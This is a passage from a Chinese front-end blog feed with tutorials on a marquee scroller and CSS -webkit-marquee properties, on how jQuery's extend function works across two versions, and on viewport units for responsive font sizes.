 <span class="tag">&lt;<span class="name">title</span>&gt;</span>Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#box</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#EFEFEF</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#F8F8F8</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>:<span class="number">0</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>:<span class="number">22px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>:hidden;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">        我是Barret Lee1<span class="tag">&lt;<span class="name">br</span>&gt;</span> 我是Barret Lee2<span class="tag">&lt;<span class="name">br</span>&gt;</span> 我是Barret Lee3<span class="tag">&lt;<span class="name">br</span>&gt;</span> 我是Barret Lee4<span class="tag">&lt;<span class="name">br</span>&gt;</span> 我是Barret Lee5<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        我是Barret Lee1<span class="tag">&lt;<span class="name">br</span>&gt;</span> 我是Barret Lee2<span class="tag">&lt;<span class="name">br</span>&gt;</span> 我是Barret Lee3<span class="tag">&lt;<span class="name">br</span>&gt;</span> 我是Barret Lee4<span class="tag">&lt;<span class="name">br</span>&gt;</span> 我是Barret Lee5<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然，给了几个<strong>接口</strong>：</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">marquee.init(obj, <span class="punctuation">&#123;</span></span><br><span class="line"><span class="symbol">     direction:</span> <span class="string">&quot;xx&quot;</span>,  <span class="comment">//这个还没写，一般就是top和left吧~</span></span><br><span class="line"><span class="symbol">     speed:</span> <span class="number">30</span></span><br><span class="line"><span class="punctuation">&#125;</span>)<span class="punctuation">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><strong>&nbsp;补充一个css3下marquee的知识点</strong></h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">overflow</span>:-webkit-marquee;//指定溢出时滚动。</span><br><span class="line"></span><br><span class="line">-webkit-marquee-style:scroll | slide | alternate; //跑马灯样式，分三种。</span><br><span class="line"></span><br><span class="line">scroll，从一端滚动到另一端，内容完全滚入（消失）时重新开始。</span><br><span class="line"></span><br><span class="line">slide，从一端滚到另一端，内容接触到另一端后，立马重新开始。</span><br><span class="line"></span><br><span class="line">alternate，内容不跑到显示区域外，在里面来回碰壁反弹。这里主要用第一种。</span><br><span class="line"></span><br><span class="line">-webkit-marquee-repetition:infinite | number;// 跑马灯跑的次数，infinite 为</span><br><span class="line"></span><br><span class="line">无限多次，不结束。或者可以用正整数设置滚动的次数。</span><br><span class="line"></span><br><span class="line">-webkit-marquee-<span class="attribute">direction</span>:up | down | left | right; //跑动的方向，这个要注</span><br><span class="line"></span><br><span class="line">意结合实际情况，即实际你操作的标签文本流溢出在哪个方向溢出。</span><br><span class="line"></span><br><span class="line">-webkit-marquee-speed:slow | normal | fast;//跑动的速度设置。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:<span class="built_in">rgba</span>(<span class="number">250</span>,<span class="number">100</span>,<span class="number">100</span>,<span class="number">0.7</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>:<span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>:<span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>:<span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: -webkit-marquee;</span></span><br><span class="line"><span class="language-css">            -webkit-marquee-style: scroll;</span></span><br><span class="line"><span class="language-css">            -webkit-marquee-repetition: infinite;</span></span><br><span class="line"><span class="language-css">            -webkit-marquee-<span class="attribute">direction</span>: right;</span></span><br><span class="line"><span class="language-css">            -webkit-marquee-speed:normal;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>:<span class="number">1px</span> <span class="number">#ccc</span> solid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span><span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="language-css">            -webkit-marquee-<span class="attribute">direction</span>: left;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span><span class="selector-class">.up</span> &#123;</span></span><br><span class="line"><span class="language-css">            -webkit-marquee-<span class="attribute">direction</span>: up;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span><span class="selector-class">.down</span> &#123;</span></span><br><span class="line"><span class="language-css">            -webkit-marquee-<span class="attribute">direction</span>: down;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>我是Barret Lee，Barret Lee，我是Barret Lee，Barret Lee，我是Barret Lee<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;up&quot;</span>&gt;</span>我是Barret Lee，Barret Lee，我是Barret Lee，Barret Lee，我是Barret Lee<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span>我是Barret Lee，Barret Lee，我是Barret Lee，Barret Lee，我是Barret Lee<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;down&quot;</span>&gt;</span>我是Barret Lee，Barret Lee，我是Barret Lee，Barret Lee，我是Barret Lee<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>DEMO地址：<a title="css3 marquee" href="http://qianduannotes.sinaapp.com/marquee/css3marquee.html" target="_blank">http://qianduannotes.sinaapp.com/marquee/css3marquee.html</a>&nbsp;（此属性在后续新版本中已经不提供支持了 &nbsp;修改于<strong>2013/11/09</strong>）</p><p>这个还是蛮实用的~做下兼容性处理，我觉得，可以直接拿过来用：)</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解读jQuery中extend函数</title>
      <link href="/blog/2013/07/20/cb-extend-in-jQuery/"/>
      <url>/blog/2013/07/20/cb-extend-in-jQuery/</url>
      
        <content type="html"><![CDATA[<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">$.extend.apply( <span class="keyword">null</span>, [ <span class="keyword">true</span>, &#123; &quot;a&quot; : <span class="number">1</span>, &quot;b&quot; : <span class="number">2</span> &#125; ] );//console.log(<span class="keyword">window</span>.a);//<span class="keyword">window</span>.<span class="keyword">location</span>.reload();</span><br><span class="line">$.extend.apply( <span class="keyword">null</span>, [ <span class="keyword">true</span>, &#123; &quot;a&quot; : <span class="number">1</span>, &quot;b&quot; : <span class="number">2</span> &#125; ].concat( &#123; &quot;c&quot; : <span class="number">3</span>, &quot;d&quot; : <span class="number">4</span> &#125; ) );</span><br><span class="line">//console.log(<span class="keyword">window</span>.a)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>一、问题：</strong></p><p>　　1. null在这里是干啥？</p><p>　　2. window.a分别是什么？</p><p><strong>二、我们先一起来了解下jQuery中的extend函数</strong></p><p>&nbsp;在jQuery-V1.2.6中：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">jQuery.extend = jQuery.fn.extend = <span class="keyword">function</span>() &#123;</span><br><span class="line">    // <span class="keyword">copy</span> reference <span class="keyword">to</span> target <span class="keyword">object</span></span><br><span class="line">    var target = arguments[<span class="number">0</span>] || &#123;&#125;, i = <span class="number">1</span>, length = arguments.length, deep = <span class="keyword">false</span>, <span class="keyword">options</span>;</span><br><span class="line"></span><br><span class="line">    // Handle a deep <span class="keyword">copy</span> situation</span><br><span class="line">    <span class="keyword">if</span> ( target.constructor == <span class="type">Boolean</span> ) &#123;</span><br><span class="line">        deep = target;</span><br><span class="line">        target = arguments[<span class="number">1</span>] || &#123;&#125;;</span><br><span class="line">        // skip the <span class="type">boolean</span> <span class="keyword">and</span> the target</span><br><span class="line">        i = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Handle <span class="keyword">case</span> <span class="keyword">when</span> target <span class="keyword">is</span> a string <span class="keyword">or</span> something (possible <span class="keyword">in</span> deep <span class="keyword">copy</span>)</span><br><span class="line">    <span class="keyword">if</span> ( typeof target != &quot;object&quot; &amp;&amp; typeof target != &quot;function&quot; )</span><br><span class="line">        target = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    // extend jQuery itself <span class="keyword">if</span> <span class="keyword">only</span> one argument <span class="keyword">is</span> passed</span><br><span class="line">    <span class="keyword">if</span> ( length == i ) &#123;</span><br><span class="line">        target = this;</span><br><span class="line">        <span class="comment">--i;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( ; i &lt; length; i++ )</span><br><span class="line">        // <span class="keyword">Only</span> deal <span class="keyword">with</span> non-<span class="keyword">null</span>/undefined <span class="keyword">values</span></span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">options</span> = arguments[ i ]) != <span class="keyword">null</span> )</span><br><span class="line">            // Extend the base <span class="keyword">object</span></span><br><span class="line">            <span class="keyword">for</span> ( var <span class="type">name</span> <span class="keyword">in</span> <span class="keyword">options</span> ) &#123;</span><br><span class="line">                var src = target[ <span class="type">name</span> ], copy = <span class="keyword">options</span>[ <span class="type">name</span> ];</span><br><span class="line"></span><br><span class="line">                // Prevent never-ending <span class="keyword">loop</span></span><br><span class="line">                <span class="keyword">if</span> ( target === <span class="keyword">copy</span> )</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                // Recurse <span class="keyword">if</span> w<span class="string">e&#x27;re merging object values</span></span><br><span class="line"><span class="string">                if ( deep &amp;&amp; copy &amp;&amp; typeof copy == &quot;object&quot; &amp;&amp; !copy.nodeType )</span></span><br><span class="line"><span class="string">                    target[ name ] = jQuery.extend( deep,</span></span><br><span class="line"><span class="string">                        // Never move original objects, clone them</span></span><br><span class="line"><span class="string">                        src || ( copy.length != null ? [ ] : &#123; &#125; )</span></span><br><span class="line"><span class="string">                    , copy );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                // Don&#x27;</span>t bring <span class="keyword">in</span> undefined <span class="keyword">values</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="keyword">copy</span> !== undefined )</span><br><span class="line">                    target[ <span class="type">name</span> ] = <span class="keyword">copy</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    // <span class="keyword">Return</span> the modified <span class="keyword">object</span></span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">jQuery - v1<span class="number">.2</span><span class="number">.6</span> extend</span><br></pre></td></tr></table></figure><p>在jQuery-V1.8.2中：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">jQuery.extend = jQuery.fn.extend = <span class="keyword">function</span>() &#123;</span><br><span class="line">    var <span class="keyword">options</span>, <span class="type">name</span>, src, <span class="keyword">copy</span>, copyIsArray, clone,</span><br><span class="line">        target = arguments[<span class="number">0</span>] || &#123;&#125;,</span><br><span class="line">        i = <span class="number">1</span>,</span><br><span class="line">        length = arguments.length,</span><br><span class="line">        deep = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    // Handle a deep <span class="keyword">copy</span> situation</span><br><span class="line">    <span class="keyword">if</span> ( typeof target === &quot;boolean&quot; ) &#123;</span><br><span class="line">        deep = target;</span><br><span class="line">        target = arguments[<span class="number">1</span>] || &#123;&#125;;</span><br><span class="line">        // skip the <span class="type">boolean</span> <span class="keyword">and</span> the target</span><br><span class="line">        i = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Handle <span class="keyword">case</span> <span class="keyword">when</span> target <span class="keyword">is</span> a string <span class="keyword">or</span> something (possible <span class="keyword">in</span> deep <span class="keyword">copy</span>)</span><br><span class="line">    <span class="keyword">if</span> ( typeof target !== &quot;object&quot; &amp;&amp; !jQuery.isFunction(target) ) &#123;</span><br><span class="line">        target = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // extend jQuery itself <span class="keyword">if</span> <span class="keyword">only</span> one argument <span class="keyword">is</span> passed</span><br><span class="line">    <span class="keyword">if</span> ( length === i ) &#123;</span><br><span class="line">        target = this;</span><br><span class="line">        <span class="comment">--i;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( ; i &lt; length; i++ ) &#123;</span><br><span class="line">        // <span class="keyword">Only</span> deal <span class="keyword">with</span> non-<span class="keyword">null</span>/undefined <span class="keyword">values</span></span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">options</span> = arguments[ i ]) != <span class="keyword">null</span> ) &#123;</span><br><span class="line">            // Extend the base <span class="keyword">object</span></span><br><span class="line">            <span class="keyword">for</span> ( <span class="type">name</span> <span class="keyword">in</span> <span class="keyword">options</span> ) &#123;</span><br><span class="line">                src = target[ <span class="type">name</span> ];</span><br><span class="line">                copy = <span class="keyword">options</span>[ <span class="type">name</span> ];</span><br><span class="line"></span><br><span class="line">                // Prevent never-ending <span class="keyword">loop</span></span><br><span class="line">                <span class="keyword">if</span> ( target === <span class="keyword">copy</span> ) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // Recurse <span class="keyword">if</span> w<span class="string">e&#x27;re merging plain objects or arrays</span></span><br><span class="line"><span class="string">                if (deep &amp;&amp; copy &amp;&amp; (jQuery.isPlainObject(copy) || (copyIsArray = jQuery.isArray(copy))))&#123;</span></span><br><span class="line"><span class="string">                    if ( copyIsArray ) &#123;</span></span><br><span class="line"><span class="string">                        copyIsArray = false;</span></span><br><span class="line"><span class="string">                        clone = src &amp;&amp; jQuery.isArray(src) ? src : [];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    &#125; else &#123;</span></span><br><span class="line"><span class="string">                        clone = src &amp;&amp; jQuery.isPlainObject(src) ? src : &#123;&#125;;</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    // Never move original objects, clone them</span></span><br><span class="line"><span class="string">                    target[ name ] = jQuery.extend( deep, clone, copy );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                // Don&#x27;</span>t bring <span class="keyword">in</span> undefined <span class="keyword">values</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="keyword">copy</span> !== undefined ) &#123;</span><br><span class="line">                    target[ <span class="type">name</span> ] = <span class="keyword">copy</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // <span class="keyword">Return</span> the modified <span class="keyword">object</span></span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">jQuery - V1<span class="number">.8</span><span class="number">.2</span> extend</span><br></pre></td></tr></table></figure><p>&nbsp;比较两个版本的jQuery，extend函数总体构架上基本没有变化，高版本中写代码更加规范了，很多var变量都前置（这是比较好的编码习惯，当然，也是为了方便压缩工具对代码进行压缩）。</p><p>jQuery.fn.extend就是把extend函数绑定到他的原型链中。这样一来，既可以作为静态函数在$上直接引用($.extend)，也可以在$(obj)上使用extend。</p><ul><li><a href="http://api.jquery.com/jQuery.extend/" target="_blank">jQuery.extend() API文档</a></li><li><a href="http://api.jquery.com/jQuery.fn.extend/" target="_blank">jQuery.fn.extend() API文档</a></li></ul><p><em>注意，如果函数没有在原型链上绑定，是不能被\继承"的！</em></p><p>代码大概的意思就是：</p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">　　第一个参数是boolean类型 ---------&gt; 深度递归复制</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">---------&gt; 如果只有一个参数（除第一个boolean）---------&gt; 将函数的this环境extend进去</span><br><span class="line">                        |</span><br><span class="line">                        |</span><br><span class="line">                        ---------&gt; 将后面的参数extend到<span class="string">\第一个&quot;参数中</span> ---------&gt; 返回<span class="string">\第一个&quot;参数</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>三、问题解释</strong></p><ul><li><strong>&nbsp;第一个问题中，</strong></li></ul><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$.extend.apply( <span class="literal">null</span>, [ <span class="literal">true</span>, &#123; <span class="string">&quot;a&quot;</span> : <span class="number">1</span>, <span class="string">&quot;b&quot;</span> : <span class="number">2</span> &#125; ] );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>extend作为一个静态函数被调用，null被绑定，但是因为满足\只有一个"参数（boolean除外）的条件 ， 将函数的this环境（window）extend进去，return的对象就是window对象，所以得到的结果是</p><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="keyword">window</span> </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>即，window.a = 1<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="symbol">&amp;nbsp;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://images.cnitblog.com/blog/387325/201307/20134313-96862ff8cfa84a72a7ef6ab81b6d66a6.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">strong</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>第二个问题中，<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>$.extend.apply( null, [ true, { “a” : 1, “b” : 2 } ].concat( { “c” : 3, “d” : 4 } ) );</p><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>相当于传入三个参数，第一个是true，第二个是 匿名对象</span><span class="language-xquery">&#123; <span class="string">&quot;a&quot;</span> : <span class="number">1</span>, <span class="string">&quot;b&quot;</span> : <span class="number">2</span> &#125;</span><span class="language-xml">，第三个是匿名对象</span><span class="language-xquery">&#123; <span class="string">&quot;c&quot;</span> : <span class="number">3</span>, <span class="string">&quot;d&quot;</span> : <span class="number">4</span> &#125;</span><span class="language-xml">, 此时的this环境是null（因为将函数绑定到null上面了）。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>那么结果就是</span><span class="language-xquery">&#123; <span class="string">&quot;a&quot;</span> : <span class="number">1</span>, <span class="string">&quot;b&quot;</span> : <span class="number">2</span>,&amp;nbsp;<span class="string">&quot;c&quot;</span> : <span class="number">3</span>, <span class="string">&quot;d&quot;</span> : <span class="number">4</span> &#125;</span><span class="language-xml">, 此刻并不能在window中索引到a这个属性<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://images.cnitblog.com/blog/387325/201307/20134220-8b0da1f1b68c41d190e65c9925dca2c4.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>如要想要访问，那便是null.a，但这种访问方式肯定是不对的。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>由于没有变量来接收这个返回的值，所以被作为垃圾给回收了。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>有兴趣的童鞋可以试试这个：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>$.extend.apply( $, [ true, { “a” : 1, “b” : 2 } ] );<br>$.extend.apply( $, [ true, { “a” : 1, “b” : 2 } ].concat( { “c” : 3, “d” : 4 } ) );</p><pre><code>&lt;p&gt;把$作为当前的环境，看看a被绑定在那个元素上了~&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&amp;nbsp;四、小结&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;　　jQuery是一个非常优秀的JS库，也是前辈们学习JS后经验的总结和思想的结晶，从jQuery1.2版本到现在的2.0版本，代码风格上、函数处理方式上有比较明显的改变，很值得花些功夫去研究。学习的过程中多看看ta们的编码风格、编码规范，了解库的整体构架和实现原理，这样应该会有比较大的提升~&lt;/p&gt;&lt;p&gt;　　我觉得前端这方面想独树一帜，就必须在代码中体现自己的思想。&lt;/p&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字体大小自适应纯css解决方案</title>
      <link href="/blog/2013/07/04/cb-change-fontSize-with-pure-css/"/>
      <url>/blog/2013/07/04/cb-change-fontSize-with-pure-css/</url>
      
        <content type="html"><![CDATA[<h3><span>viewpoint</span></h3><p>css3提供了一些与当前viewpoint相关的元素，vw，vh，vim等。</p><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">\viewpoint<span class="string">&quot; = window size</span></span><br><span class="line"></span><br><span class="line">vw = <span class="number">1</span>% of viewport width</span><br><span class="line"><span class="number">1</span>vh = <span class="number">1</span>% of viewport height</span><br><span class="line"><span class="number">1</span>vmin = <span class="number">1</span>vw or <span class="number">1</span>vh, 最小</span><br><span class="line"><span class="number">1</span>vmax = <span class="number">1</span>vw or <span class="number">1</span>vh, 最大</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>兼容性：chrome 20+/ safari 6+/ IE 10+ / FF 19+ / IOS 6+</strong></p><p><strong>DEMO地址：<a href="http://qianduannotes.sinaapp.com/test/fontResize.html" target="_blank">http://qianduannotes.sinaapp.com/test/fontResize.html</a>&nbsp; </strong>（已经用JS修正重绘bug）</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#box</span> &#123; <span class="attribute">font-size</span>: <span class="number">4vw</span>;&#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">        我是Barret Lee 我是Barret Lee 我是Barret Lee</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是该方案存在一个bug，上面的代码，当浏览器窗口变化的时候，box中的文字并没有按照应有的比例变化，但是css3标准中是这么说的：</p><blockquote><p><span>When the height or width of the viewport is changed, they are scaled accordingly.</span></p></blockquote><h3>插曲</h3><p>像这样的问题，我之前也遇到过，比如以下代码：<strong>（小插曲，可跳过）</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS3 Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span>, <span class="selector-tag">div</span> &#123; <span class="attribute">margin</span>:<span class="number">0</span>; <span 